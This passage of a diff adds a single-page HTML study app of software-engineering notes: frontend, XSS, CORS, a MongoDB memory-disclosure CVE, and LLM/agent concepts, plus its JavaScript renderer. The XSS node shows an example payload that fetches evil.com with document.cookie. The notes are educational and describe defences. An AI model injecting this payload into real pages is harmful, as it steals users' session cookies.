+      yield put({ type: 'SET_ERROR', payload: e });
+    }
+  }</pre>
+<h3>Storage Types</h3>
+<table>
+  <thead><tr><th>Storage</th><th>Persists after refresh?</th><th>Use for</th></tr></thead>
+  <tbody>
+    <tr><td>React state</td><td>No</td><td>Ephemeral UI state</td></tr>
+    <tr><td>Redux store</td><td>No</td><td>Global app state</td></tr>
+    <tr><td><code>localStorage</code></td><td>Yes (until cleared)</td><td>User preferences, auth token</td></tr>
+    <tr><td><code>sessionStorage</code></td><td>No (tab close = gone)</td><td>Session-specific data</td></tr>
+    <tr><td>Cookies</td><td>Configurable</td><td>Auth sessions, tracking</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-10-04" data-type="node" data-trail="trail-10" data-order="4"
+  data-title="Frontend Concepts and Next.js"
+  data-file="Frontend/FE Download.md"
+  data-bridge="">
+<h3>React vs Vanilla JS</h3>
+<div class="compare">
+  <div><h4>Vanilla JS</h4><pre>document.getElementById('btn')
+  .addEventListener('click', () =&gt; {
+    el.innerHTML = 'Clicked';
+  });
+Manual DOM updates.
+Error-prone at scale.</pre></div>
+  <div><h4>React</h4><pre>function Button({ label, onClick }) {
+  return &lt;button onClick={onClick}&gt;
+    {label}
+  &lt;/button&gt;;
+}
+Declarative — describe WHAT
+React figures out HOW ✓</pre></div>
+</div>
+<h3>React vs Next.js</h3>
+<table>
+  <thead><tr><th></th><th>React (plain)</th><th>Next.js</th></tr></thead>
+  <tbody>
+    <tr><td>Rendering</td><td>Client-side only</td><td>SSR, SSG, ISR, Edge</td></tr>
+    <tr><td>Routing</td><td>Manual (React Router)</td><td>File-based (<code>pages/</code> or <code>app/</code>)</td></tr>
+    <tr><td>API routes</td><td>No (separate backend)</td><td>Yes (<code>pages/api/</code>)</td></tr>
+    <tr><td>SEO</td><td>Poor (empty shell)</td><td>Excellent (pre-rendered HTML)</td></tr>
+    <tr><td>Deploy to</td><td>CDN / S3 (static only)</td><td>Vercel, VPS, Docker, AWS</td></tr>
+  </tbody>
+</table>
+<h3>TypeScript Benefit</h3>
+<div class="compare">
+  <div><h4>JavaScript</h4><pre>function Greeting({ name }) {
+  return &lt;h1&gt;Hello {name}&lt;/h1&gt;;
+}
+// Wrong type → fails silently
+// at runtime ✗</pre></div>
+  <div><h4>TypeScript</h4><pre>type Props = { name: string }
+function Greeting({ name }: Props) {
+  return &lt;h1&gt;Hello {name}&lt;/h1&gt;;
+}
+// Wrong type → caught at compile ✓</pre></div>
+</div>
+<ul>
+  <li>Functional components (modern) use hooks; class components (legacy) use <code>this.state</code> + lifecycle methods</li>
+  <li>ES6 key features: arrow functions, destructuring, spread, template literals, optional chaining (<code>user?.profile?.avatar</code>)</li>
+</ul>
+</template>
+
+<!-- Trail 11: Security -->
+<template id="node-11-01" data-type="node" data-trail="trail-11" data-order="1"
+  data-title="XSS Attacks"
+  data-file="Security/XSS Attacks.md"
+  data-bridge="XSS shows what happens when browsers execute untrusted scripts. CORS is the complementary browser mechanism: the Same-Origin Policy and its controlled relaxation via HTTP headers that governs which cross-origin requests browsers allow.">
+<h3>Three Types</h3>
+<table>
+  <thead><tr><th>Type</th><th>How</th><th>Real example</th></tr></thead>
+  <tbody>
+    <tr><td>Stored XSS</td><td>Script saved to DB; executes for all visitors</td><td>Samy Worm (2005) — spread to 1M MySpace profiles in 20 hrs</td></tr>
+    <tr><td>Reflected XSS</td><td>Script in URL; victim must click malicious link</td><td>PayPal bug (2019) — session token stolen, $115K bounty</td></tr>
+    <tr><td>DOM-based XSS</td><td>Client-side JS reads URL/hash → writes to DOM without escaping</td><td>Google Docs bug — executed via document URL fragment</td></tr>
+  </tbody>
+</table>
+<h3>Attack Flow</h3>
+<pre>
+  1. Attacker finds unsanitised input
+  2. Injects: &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;
+  3. Victim loads page / clicks link
+  4. Browser executes script
+  5. Result: session hijacking, credential theft, worm propagation</pre>
+<h3>Prevention Layers</h3>
+<div class="good">
+  <ul>
+    <li><strong>Input sanitisation</strong> (server-side): strip/escape dangerous chars before storing — Python: <code>bleach</code>, <code>nh3</code>; Node: <code>sanitize-html</code></li>
+    <li><strong>Output escaping</strong> (when rendering): escape HTML entities — <code>&lt; → &amp;lt;</code> — Django/Jinja2 auto-escape ✓; React auto-escapes JSX ✓</li>
+    <li><strong>CSP headers</strong>: browser enforces <code>Content-Security-Policy: default-src 'self'</code> — blocks inline scripts even if injection succeeds</li>
+    <li><strong>textContent over innerHTML</strong>: textContent never executes scripts</li>
+  </ul>
+</div>
+<div class="warn">React's <code>dangerouslySetInnerHTML</code> bypasses auto-escaping — use only with sanitised content.</div>
+</template>
+
+<template id="node-11-02" data-type="node" data-trail="trail-11" data-order="2"
+  data-title="CORS"
+  data-file="Security/CORS.md"
+  data-bridge="XSS and CORS are application-layer controls. MongoBleed shows a lower-level attack: a server-side memory disclosure vulnerability that requires no credentials — just an IP address and a malformed compressed packet.">
+<h3>Why CORS Exists</h3>
+<pre>
+  SOP (Same-Origin Policy): page can only READ responses from same origin
+  Origin = scheme + host + port
+
+  Without SOP:
+    You visit evil.com → JS calls bank.com API with your cookies
+    → reads your balance → sends to attacker ✗
+
+  CORS: controlled relaxation — servers explicitly say which origins are allowed.</pre>
+<h3>Simple vs Preflight</h3>
+<pre>
+  SIMPLE REQUEST (direct, no preflight):
+    Method: GET, HEAD, or POST
+    No custom headers; Content-Type is safe list
+    → Browser sends request + Origin header
+    → Server must include Access-Control-Allow-Origin
+
+  PREFLIGHT (OPTIONS first):
+    Method: PUT, DELETE, PATCH  OR
+    Custom headers (Authorization, X-Api-Key)  OR
+    Content-Type: application/json
+
+    Browser: OPTIONS /api/data
+             Access-Control-Request-Method: POST
+             Access-Control-Request-Headers: Authorization
+    Server must respond with Allow-Origin, Allow-Methods, Allow-Headers
+    Only then → browser sends actual request</pre>
+<h3>Fix: Configure the Backend</h3>
+<pre>
+  Express:  app.use(cors({ origin: 'https://myapp.com' }));
+
+  FastAPI:  app.add_middleware(CORSMiddleware,
+                allow_origins=["https://myapp.com"],
+                allow_headers=["Authorization"])
+
+  Can't change backend? Use a PROXY:
+    Browser → your proxy (same origin, no CORS) → external API</pre>
+<div class="info"><strong>CORS vs CSRF:</strong> CORS = browser access control for cross-origin <em>reads</em>. CSRF = forged <em>writes</em>. Different attacks, both matter. <code>Access-Control-Allow-Origin: *</code> cannot be combined with <code>Allow-Credentials: true</code>.</div>
+</template>
+
+<template id="node-11-03" data-type="node" data-trail="trail-11" data-order="3"
+  data-title="MongoBleed: A Real-World Exploit"
+  data-file="MongoBleed.md"
+  data-bridge="">
+<h3>The Vulnerability</h3>
+<pre>
+  CVE-2025-14847: "MongoBleed"
+  Type: Unauthenticated Memory Disclosure
+  Component: MongoDB Wire Protocol — zlib compression handling
+
+  What the attacker needs:  IP address + port 27017
+                             NO username, NO password, NO connection string</pre>
+<h3>How It Works</h3>
+<pre>
+  Normal compressed message:
+  ┌────────────────────────────────────────┐
+  │  [zlib compressed payload, N bytes]   │
+  └────────────────────────────────────────┘
+  Server decompresses → processes command ✓
+
+  Malformed message (attack):
+  ┌────────────────────────────────────────┐
+  │  [claims N bytes, actually M &lt; N]     │
+  └────────────────────────────────────────┘
+  Server tries to read N bytes from M-byte buffer
+  → reads PAST the buffer (over-read)
+  → returns raw server memory: other users' data,
+    session tokens, API keys</pre>
+<h3>Risk Assessment</h3>
+<table>
+  <thead><tr><th>Exposure</th><th>Risk</th></tr></thead>
+  <tbody>
+    <tr><td>Port 27017 open to public internet</td><td>Critical — automated scanners exploit within minutes</td></tr>
+    <tr><td>MongoDB inside private VPC/firewall</td><td>Medium — safe from direct attack; vulnerable to lateral movement</td></tr>
+  </tbody>
+</table>
+<h3>Remediation</h3>
+<ul>
+  <li><strong>Patch immediately</strong>: MongoDB 7.0.28+, 6.0.27+, or 5.0.31+</li>
+  <li><strong>Workaround</strong> (if can't patch): disable zlib in <code>mongod.conf</code>: <code>compressors: snappy,zstd</code></li>
+  <li><strong>Best practice always</strong>: never expose port 27017 to the internet; whitelist allowed IPs only</li>
+</ul>
+<div class="info">The vulnerability is in the Wire Protocol layer — not your application code. Patching requires updating the MongoDB server binary itself. The driver handles compression transparently; you may not know zlib is in use.</div>
+</template>
+
+<!-- Trail 12: AI & Modern Stack -->
+<template id="node-12-01" data-type="node" data-trail="trail-12" data-order="1"
+  data-title="Confusion Matrix, L1 and L2 Regularization"
+  data-file="AI-ML/Confusion Matrix, L1, L2.md"
+  data-bridge="Before deploying any model, you need metrics to evaluate it. With the evaluation vocabulary in hand, the next question is how to make a general LLM useful in a specific domain — RAG, fine-tuning, and CAG each answer that differently.">
+<h3>Confusion Matrix</h3>
+<pre>
+  Actual \ Predicted │  Positive  │  Negative
+  ───────────────────┼────────────┼─────────────────
+  Positive           │  TP ✓      │  FN ✗  (Type II)
+  Negative           │  FP ✗      │  TN ✓
+                     (Type I)</pre>
+<h3>Derived Metrics</h3>
+<table>
+  <thead><tr><th>Metric</th><th>Formula</th><th>Use when FP/FN cost is high</th></tr></thead>
+  <tbody>
+    <tr><td>Accuracy</td><td>(TP+TN)/(TP+TN+FP+FN)</td><td>Balanced classes</td></tr>
+    <tr><td>Precision</td><td>TP/(TP+FP)</td><td>False positives are costly (spam, fraud detection)</td></tr>
+    <tr><td>Recall</td><td>TP/(TP+FN)</td><td>False negatives are costly (cancer, security alerts)</td></tr>
+    <tr><td>F1-Score</td><td>2 × (P×R)/(P+R)</td><td>Balance both (harmonic mean)</td></tr>
+    <tr><td>Specificity</td><td>TN/(TN+FP)</td><td>True negative rate</td></tr>
+  </tbody>
+</table>
+<h3>L1 vs L2 Regularisation</h3>
+<div class="compare">
+  <div><h4>L1 (Lasso)</h4><pre>Loss + λ × Σ|wᵢ|
+Drives weights to EXACTLY zero
+→ feature selection
+→ sparse model</pre></div>
+  <div><h4>L2 (Ridge)</h4><pre>Loss + λ × Σwᵢ²
+Shrinks weights TOWARDS zero
+→ all features kept
+→ handles correlated features</pre></div>
+</div>
+<ul>
+  <li><strong>λ</strong> (lambda): regularisation strength — higher = simpler model, lower = fits training data more</li>
+  <li>Purpose: prevent overfitting by penalising model complexity</li>
+</ul>
+</template>
+
+<template id="node-12-02" data-type="node" data-trail="trail-12" data-order="2"
+  data-title="LLMs: Fine-Tuning, RAG, and CAG"
+  data-file="AI-ML/LLMs- Fine Tuning, RAG.md"
+  data-bridge="RAG retrieves knowledge; AI Agents go further — they use LLMs to reason about goals, choose tools, and act. This note covers the evolution from compound AI systems to autonomous agents using the ReAct pattern.">
+<h3>Three Approaches</h3>
+<pre>
+  BASE LLM → general knowledge, training cutoff, no domain expertise
+
+  FINE-TUNING:
+    Training on domain-specific labelled examples
+    → updates model WEIGHTS
+    → domain knowledge baked in permanently
+    Fast inference (no retrieval) | Expensive to retrain
+
+  RAG (Retrieval-Augmented Generation):
+    Offline: chunk docs → embed → vector DB
+    Online:  query → embed → retrieve top-K → inject into prompt → generate
+    Dynamic data | Transparent sources | Easy to update index
+
+  CAG (Cache-Augmented Generation):
+    Preload entire knowledge base into context window
+    → cached as KV pairs in GPU memory
+    → queries answered from cache (no retrieval step)
+    Fast | Limited by context window size</pre>
+<h3>Comparison</h3>
+<table>
+  <thead><tr><th></th><th>Fine-Tuning</th><th>RAG</th><th>CAG</th></tr></thead>
+  <tbody>
+    <tr><td>Knowledge location</td><td>Model weights</td><td>External vector DB</td><td>Context / KV cache</td></tr>
+    <tr><td>Update when data changes</td><td>Full retrain (expensive)</td><td>Update index (easy)</td><td>Recompute KV cache</td></tr>
+    <tr><td>Inference speed</td><td>Fast (no retrieval)</td><td>Slower (retrieval step)</td><td>Fast (no retrieval)</td></tr>
+    <tr><td>Source citations?</td><td>No</td><td>Yes</td><td>Possible</td></tr>
+    <tr><td>Best for</td><td>Domain tone/style</td><td>Dynamic, large knowledge</td><td>Small, static knowledge</td></tr>
+  </tbody>
+</table>
+<div class="info">This second brain is a variant of RAG/CAG — Claude reads your vault notes to tailor explanations to your existing knowledge. Hybrid: fine-tune for domain language + RAG for current data = best of both.</div>
+</template>
+
+<template id="node-12-03" data-type="node" data-trail="trail-12" data-order="3"
+  data-title="AI Agents"
+  data-file="AI-ML/AI Agents.md"
+  data-bridge="Agents need a standard way to connect to external tools and data. MCP (Model Context Protocol) is that standard — a client-server design that separates the smart client (LLM) from the dumb executor (tool server).">
+<h3>Evolution</h3>
+<pre>
+  MONOLITHIC MODEL:
+    LLM input → LLM → output
+    Limited to training data. Cannot take actions.
+
+  COMPOUND AI SYSTEM:
+    LLM + data retrieval + tools (pre-defined workflow)
+    e.g. RAG: LLM + vector DB
+    Can access external data but workflow is hardcoded.
+
+  AI AGENT:
+    LLM CONTROLS the logic:
+    - Reasons about what to do next
+    - Chooses which tool to call
+    - Acts on the result
+    - Loops until task is complete
+    The LLM is no longer a component — it IS the controller.</pre>
+<h3>Agent Capabilities</h3>
+<table>
+  <thead><tr><th>Capability</th><th>What it means</th></tr></thead>
+  <tbody>
+    <tr><td>Reasoning</td><td>Create a plan; break complex goals into sub-tasks</td></tr>
+    <tr><td>Acting</td><td>Call external tools (search, DB, calculator, API, code exec)</td></tr>
+    <tr><td>Memory</td><td>In-context (recent history), external (stored past interactions via RAG)</td></tr>
+  </tbody>
+</table>
+<h3>ReAct Pattern (Reason + Act)</h3>
+<pre>
+  User: "How much sunscreen for Florida vacation?"
+
+  Thought: I need vacation length, weather, and dosage info.
+  Act: get_vacation_length(user_id) → 7 days
+  Thought: I need Florida weather forecast.
+  Act: weather_api(location="Florida", days=7) → UV index 9
+  Thought: I need sunscreen dosage for UV 9.
+  Act: search("SPF 50 dose UV 9 per day") → 2 oz, every 2 hrs
+  Thought: Calculate.
+  Answer: 7 days × 4 apps/day × 2 oz = ~56 oz. Pack 4 bottles.</pre>
+<ul>
+  <li>Programmatic approaches better for narrow, well-defined tasks; agentic approaches for complex, open-ended tasks</li>
+  <li>Autonomy is a slider: low = LLM suggests, human approves; high = LLM decides and acts</li>
+</ul>
+</template>
+
+<template id="node-12-04" data-type="node" data-trail="trail-12" data-order="4"
+  data-title="MCP: Model Context Protocol"
+  data-file="AI-ML/MCP.md"
+  data-bridge="MCP provides the tool interface; LangGraph provides the control flow. It replaces manual while-loops with a declarative graph where nodes, edges, and shared state make complex agent flows visible and maintainable.">
+<h3>Architecture</h3>
+<pre>
+  ┌─────────────────────────────────────────────────────────────┐
+  │                    MCP CLIENT                                │
+  │  (your IDE: VS Code, Cursor, or custom app)                 │
+  │                                                             │
+  │  ┌─────────────────────────────────────────────────────┐   │
+  │  │                  LLM (brain)                         │   │
+  │  │  Reads tool schemas → decides which to call          │   │
+  │  └─────────────────────────────────────────────────────┘   │
+  └──────────────────────────┬──────────────────────────────────┘
+                             │ JSON-RPC 2.0 (stdio or HTTP)
+  ┌──────────────────────────┼──────────────────────────────────┐
+  │         MCP SERVER (dumb executor)                          │
+  │                          │                                  │
+  │  ┌──────────────┐  ┌─────▼──────────┐  ┌────────────────┐  │
+  │  │  Resources   │  │     Tools      │  │    Prompts     │  │
+  │  │ (static data)│  │ (API actions)  │  │ (LLM guidance) │  │
+  │  │ airport list │  │ search_flights │  │ "call search   │  │
+  │  │ refund policy│  │ book_flight    │  │  first"        │  │
+  │  └──────────────┘  └────────────────┘  └────────────────┘  │
+  └─────────────────────────────────────────────────────────────┘</pre>
+<div class="info"><strong>Vending machine analogy:</strong> Server = vending machine with labelled buttons (APIs). Client (LLM) = the person who knows which button to press based on what you asked for. Server does NOT run an LLM.</div>
+<table>
+  <thead><tr><th>Component</th><th>What it is</th><th>Example</th></tr></thead>
+  <tbody>
+    <tr><td>Resource</td><td>Static / reference data</td><td>Airport codes, refund policy</td></tr>
+    <tr><td>Tool</td><td>Discrete action with input schema</td><td><code>search_flights(origin, dest, date)</code></td></tr>
+    <tr><td>Prompt</td><td>Workflow instruction for LLM</td><td>"Always search before booking"</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-12-05" data-type="node" data-trail="trail-12" data-order="5"
+  data-title="LangGraph Flow"
+  data-file="AI-ML/Langgraph Flow.md"
+  data-bridge="With the mechanics of LLMs and agents understood, Karpathy's essay reframes the entire picture: what does this paradigm shift mean for how software is built, and for your role as an engineer?">
+<h3>Why LangGraph</h3>
+<div class="compare">
+  <div><h4>Legacy (while loop)</h4><pre>while round_count &lt; max:
+    content, tools = llm.generate(...)
+    if not tools: break
+    for call in tools:
+        execute_tool(call) # manual
+    round_count += 1
+→ becomes spaghetti as flows
+  grow complex</pre></div>
+  <div><h4>LangGraph (declarative graph)</h4><pre>init_context → add_message
+    → evaluate_templates → llm
+                            │
+                     tool_calls?
+                        ↓  ↑
+                      tools ─┘
+                        │
+                       END
+Flow IS the structure ✓</pre></div>
+</div>
+<h3>Core Concepts</h3>
+<table>
+  <thead><tr><th>Concept</th><th>What it is</th></tr></thead>
+  <tbody>
+    <tr><td>StateGraph</td><td>The graph container; parameterised by a TypedDict schema</td></tr>
+    <tr><td>Node</td><td>Async function: receives full state, returns PARTIAL update</td></tr>
+    <tr><td>Edge</td><td>Normal (always A→B) or Conditional (function decides next)</td></tr>
+    <tr><td>State</td><td>TypedDict shared across all nodes; LangGraph merges partial updates</td></tr>
+    <tr><td>ToolNode</td><td>Prebuilt: auto-dispatches tool calls, handles errors, returns ToolMessage</td></tr>
+    <tr><td>compile()</td><td>Validates graph; returns Runnable supporting ainvoke/astream</td></tr>
+  </tbody>
+</table>
+<h3>Knowledge Roadmap</h3>
+<table>
+  <thead><tr><th>Level</th><th>Concepts</th><th>Status in cerebrum</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td>StateGraph, nodes, edges, ToolNode, ainvoke</td><td>✓ In use</td></tr>
+    <tr><td>2</td><td>Annotated reducers, checkpointers (replaces Redis session)</td><td>Not yet</td></tr>
+    <tr><td>3</td><td>Streaming: astream, astream_events, token-level</td><td>Not yet</td></tr>
+    <tr><td>4</td><td>Human-in-the-loop: interrupt_before, NodeInterrupt</td><td>Natural fit for booking confirmations</td></tr>
+    <tr><td>5</td><td>Multi-agent: subgraphs, supervisor pattern, Send()</td><td>Future: specialist agents</td></tr>
+    <tr><td>6</td><td>LangGraph Cloud, LangSmith tracing, shared stores</td><td>Production deployment</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-12-06" data-type="node" data-trail="trail-12" data-order="6"
+  data-title="Software Is Changing (Again) — Karpathy"
+  data-file="Software Is Changing (Again) by Andrej Karpathy.md"
+  data-bridge="">
+<h3>Three Eras of Software</h3>
+<table>
+  <thead><tr><th>Era</th><th>How software is created</th><th>Example</th></tr></thead>
+  <tbody>
+    <tr><td>Software 1.0</td><td>Human-written code (explicit logic + rules)</td><td>Tesla autopilot early code</td></tr>
+    <tr><td>Software 2.0</td><td>Neural network weights tuned by optimisers on data</td><td>AlexNet, Tesla 2.0 autopilot</td></tr>
+    <tr><td>Software 3.0</td><td>LLMs programmed via natural language prompts</td><td>ChatGPT, Claude, Copilot</td></tr>
+  </tbody>
+</table>
+<h3>LLMs as Utilities, Fabs, and Operating Systems</h3>
+<pre>
+  AS UTILITIES:   High capex (GPU clusters), metered API access,
+                  requires high uptime — like electricity or cloud infra
+
+  AS FABS:        Enormous capital investment ($100B+ GPU clusters),
+                  rapid tech change — like semiconductor fabrication
+
+  AS OPERATING SYSTEMS:
+    LLM = the CPU (executes instructions)
+    Context window = RAM (working memory)
+    Closed-source (GPT, Claude) ↔ Open-source (Llama, Mistral)
+    "We are in the 1960s mainframe era" — expensive, centralised</pre>
+<h3>LLM Psychology</h3>
+<div class="compare">
+  <div><h4>Superpowers</h4><ul><li>Encyclopedic knowledge</li><li>Instant recall</li><li>Multilingual</li><li>Patient, tireless</li></ul></div>
+  <div><h4>Cognitive deficits</h4><ul><li>Hallucination</li><li>Jagged intelligence (superhuman some areas, fails basic maths)</li><li>Anterograde amnesia (no persistent memory)</li><li>Gullibility (prompt injection)</li></ul></div>
+</div>
+<h3>Key Properties of Well-Designed LLM Apps</h3>
+<ol>
+  <li><strong>Context management</strong>: curate what goes into the context window carefully</li>
+  <li><strong>Orchestration</strong>: multiple specialised LLMs for different tasks</li>
+  <li><strong>Auditable GUI</strong>: application-specific interface so humans can review what the LLM is doing</li>
+  <li><strong>Autonomy slider</strong>: low = LLM suggests, human approves; high = LLM acts, human monitors</li>
+</ol>
+<div class="info">"Iron Man suit" (augmentation) &gt; "Iron Man robot" (full autonomy). Partial autonomy with human oversight is safer and more valuable now. "Decade of agents, not just a year."</div>
+</template>
+
+<!-- ═══ APP SHELL ═════════════════════════════════════════════════ -->
+<div id="app">
+  <aside id="sidebar">
+    <div class="sidebar-header">
+      <h1>SDE Learning Trails</h1>
+      <div>
+        <div class="overall-bar"><div class="overall-fill" id="overall-fill" style="width:0%"></div></div>
+        <span class="overall-label" id="overall-label">0/0 nodes</span>
+      </div>
+    </div>
+    <nav id="trail-list"></nav>
+    <div class="sidebar-footer"><button id="reset-btn">Reset all progress</button></div>
+  </aside>
+  <main id="main-panel">
+    <div id="trail-view"><div class="empty-state">← Select a trail to begin</div></div>
+  </main>
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  // ── Build data from templates ────────────────────────────────────
+  const trailMap = {};
+
+  document.querySelectorAll('template[data-type="trail"]').forEach(function(el) {
+    trailMap[el.id] = {
+      id: el.id,
+      order: +el.dataset.order,
+      title: el.dataset.title,
+      objective: el.dataset.objective,
+      prereqs: el.dataset.prereqs ? el.dataset.prereqs.split(',').filter(Boolean) : [],
+      color: el.dataset.color,
+      reviewTime: el.dataset.reviewTime,
+      nodes: []
+    };
+  });
+
+  document.querySelectorAll('template[data-type="node"]').forEach(function(el) {
+    var t = trailMap[el.dataset.trail];
+    if (!t) return;
+    t.nodes.push({
+      id: el.id,
+      order: +el.dataset.order,
+      title: el.dataset.title,
+      file: el.dataset.file || '',
+      bridge: el.dataset.bridge || null,
+      el: el
+    });
+  });
+
+  var DATA = Object.values(trailMap).sort(function(a, b) { return a.order - b.order; });
+  DATA.forEach(function(t) { t.nodes.sort(function(a, b) { return a.order - b.order; }); });
+
+  // ── Progress ─────────────────────────────────────────────────────
+  var STORE = 'sde_trails_v1';
+  var progress = {};
+
+  function loadProgress() { try { progress = JSON.parse(localStorage.getItem(STORE) || '{}'); } catch(e) { progress = {}; } }
+  function saveProgress() { localStorage.setItem(STORE, JSON.stringify(progress)); }
+  function isDone(id) { return !!progress[id]; }
+  function setDone(id, v) { if (v) progress[id] = true; else delete progress[id]; saveProgress(); }
+
+  function trailStats(trail) {
+    var total = trail.nodes.length;
+    var done = trail.nodes.filter(function(n) { return isDone(n.id); }).length;
+    return { total: total, done: done, pct: total ? Math.round(done / total * 100) : 0 };
+  }
+  function overallStats() {
+    var total = 0, done = 0;
+    DATA.forEach(function(t) { t.nodes.forEach(function(n) { total++; if (isDone(n.id)) done++; }); });
+    return { total: total, done: done, pct: total ? Math.round(done / total * 100) : 0 };
+  }
+
+  // ── Content ───────────────────────────────────────────────────────
+  function getContent(node) {
+    var html = node.el.innerHTML.trim();
+    return html || '<p class="no-content">Content coming soon.</p>';
+  }
+
+  // ── State ─────────────────────────────────────────────────────────
+  var currentTrailId = null;
+  var expanded = new Set();
+
+  // ── Sidebar ───────────────────────────────────────────────────────
+  function renderSidebar() {
+    var ov = overallStats();
+    document.getElementById('overall-fill').style.width = ov.pct + '%';
+    document.getElementById('overall-label').textContent = ov.done + '/' + ov.total + ' nodes';
+    document.getElementById('trail-list').innerHTML = DATA.map(function(t) {
+      var s = trailStats(t);
+      return '<div class="trail-item' + (t.id === currentTrailId ? ' active' : '') + '" ' +
+        'style="--trail-color:' + t.color + '" onclick="app.select(\'' + t.id + '\')">' +
+        '<div class="trail-item-header">' +
+        '<span class="trail-dot" style="background:' + t.color + '"></span>' +
+        '<span class="trail-title">' + t.title + '</span>' +
+        '<span class="trail-count">' + s.done + '/' + s.total + '</span>' +
+        '</div>' +
+        '<div class="trail-prog-bar"><div class="trail-prog-fill" style="width:' + s.pct + '%;background:' + t.color + '"></div></div>' +
+        '</div>';
+    }).join('');
+  }
+
+  // ── Trail view ────────────────────────────────────────────────────
+  function renderTrail(trailId) {
+    var trail = DATA.find(function(t) { return t.id === trailId; });
+    if (!trail) return;
+    var s = trailStats(trail);
+
+    var unmet = trail.prereqs.map(function(id) { return DATA.find(function(t) { return t.id === id; }); })
+      .filter(function(t) { return t && trailStats(t).pct < 50; });
+    var prereqHtml = unmet.length
+      ? '<div class="prereq-banner">Recommended first: ' +
+        unmet.map(function(t) { return '<a onclick="app.select(\'' + t.id + '\')">' + t.title + ' (' + trailStats(t).pct + '%)</a>'; }).join(', ') +
+        '</div>'
+      : '';
+
+    var nodesHtml = trail.nodes.map(function(node, i) {
+      var done = isDone(node.id), open = expanded.has(node.id), isLast = i === trail.nodes.length - 1;
+      return '<div class="node-wrap">' +
+        '<div class="node-card' + (done ? ' done' : '') + '">' +
+        '<div class="node-header" onclick="app.toggle(\'' + node.id + '\')">' +
+        '<span class="node-num">' + node.order + '</span>' +
+        '<span class="node-title-text">' + node.title + '</span>' +
+        '<span class="node-chevron' + (open ? ' open' : '') + '">▼</span>' +
+        '<input type="checkbox" class="node-check"' + (done ? ' checked' : '') +
+        ' onclick="event.stopPropagation();app.check(\'' + node.id + '\',this.checked)" title="Mark as read">' +
+        '</div>' +
+        (open ? '<div class="node-content">' + getContent(node) + '</div>' : '') +
+        '</div>' +
+        (!isLast && node.bridge ? '<div class="bridge-note">↓ ' + node.bridge + '</div>' : '') +
+        '</div>';
+    }).join('');
+
+    document.getElementById('trail-view').innerHTML =
+      '<div class="trail-header" style="border-color:' + trail.color + '">' +
+      '<h2 style="color:' + trail.color + '">' + trail.title + '</h2>' +
+      '<p class="trail-objective">' + trail.objective + '</p>' +
+      '<div class="trail-meta"><span>⏱ ' + trail.reviewTime + '</span><span>' + s.done + '/' + s.total + ' completed</span></div>' +
+      '</div>' + prereqHtml +
+      '<div class="nodes-list">' + nodesHtml + '</div>' +
+      '<div class="trail-footer"><button onclick="app.markAll(\'' + trail.id + '\')">Mark all as read</button></div>';
+  }
+
+  // ── Public API ────────────────────────────────────────────────────
+  window.app = {
+    select: function(id) {
+      currentTrailId = id; expanded.clear();
+      history.replaceState(null, '', '#' + id);
+      renderSidebar(); renderTrail(id);
+      document.getElementById('main-panel').scrollTop = 0;
+    },
+    toggle: function(id) {
+      if (expanded.has(id)) expanded.delete(id); else expanded.add(id);
+      renderTrail(currentTrailId);
+    },
+    check: function(id, v) { setDone(id, v); renderSidebar(); renderTrail(currentTrailId); },
+    markAll: function(id) {
+      var trail = DATA.find(function(t) { return t.id === id; });
+      if (!trail || !confirm('Mark all ' + trail.nodes.length + ' nodes in "' + trail.title + '" as read?')) return;
+      trail.nodes.forEach(function(n) { setDone(n.id, true); });
+      renderSidebar(); renderTrail(id);
+    }
+  };
+
+  document.getElementById('reset-btn').addEventListener('click', function() {
+    if (!confirm('Reset all progress? This cannot be undone.')) return;
+    progress = {}; saveProgress(); renderSidebar(); if (currentTrailId) renderTrail(currentTrailId);
+  });
+
+  window.addEventListener('hashchange', function() {
+    var id = window.location.hash.slice(1);
+    if (id && id !== currentTrailId) app.select(id);
+  });
+
+  loadProgress(); renderSidebar();
+  var startId = window.location.hash.slice(1);
+  var startTrail = DATA.find(function(t) { return t.id === startId; }) || DATA[0];
+  if (startTrail) app.select(startTrail.id);
+
+})();
+</script>
+</body>
+</html>
